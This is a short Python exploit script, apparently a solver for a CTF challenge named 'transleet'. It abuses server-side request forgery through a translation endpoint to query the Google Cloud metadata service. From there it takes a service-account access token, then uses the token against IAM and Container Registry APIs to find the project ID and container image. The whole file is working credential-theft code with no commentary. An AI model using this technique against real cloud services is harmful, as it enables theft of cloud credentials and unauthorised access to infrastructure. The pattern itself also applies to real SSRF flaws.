#!/usr/bin/env python3
import requests
import json

METADATA_URL = 'http://169.254.169.254/computeMetadata/v1/instance/service-accounts'

try:
    # Get service account token
    data = {'q': f'{METADATA_URL}/default/token?H=Metadata-flavor=Google'}
    res = requests.post('https://transleet-b3ogfnye7q-ts.a.run.app/transleet',
                        data=data)
    token = json.loads(res.json()['text'])['access_token']

    # Get project number
    data = {'q': f'{METADATA_URL}/?H=Metadata-flavor=Google'}
    res = requests.post('https://transleet-b3ogfnye7q-ts.a.run.app/transleet',
                        data=data)
    project_number = res.json()['text'].split('-')[0]

    # Get project ID
    res = requests.get(
        'https://iam.googleapis.com/v1/projects/728253287091/serviceAccounts?alt=json&pageSize=100',
        headers={'Authorization': f'Bearer {token}'})
    project_id = res.json()['accounts'][0]['projectId']

    # Get container image name
    res = requests.get('https://gcr.io/v2/test-kctf/tags/list',
                       headers={'Authorization': f'Bearer {token}'})
    image = res.json()['child'][0]

    exit(0)
except (json.decoder.JSONDecodeError, KeyError,
        requests.exceptions.ConnectionError) as e:
    print(e)
    exit(1)
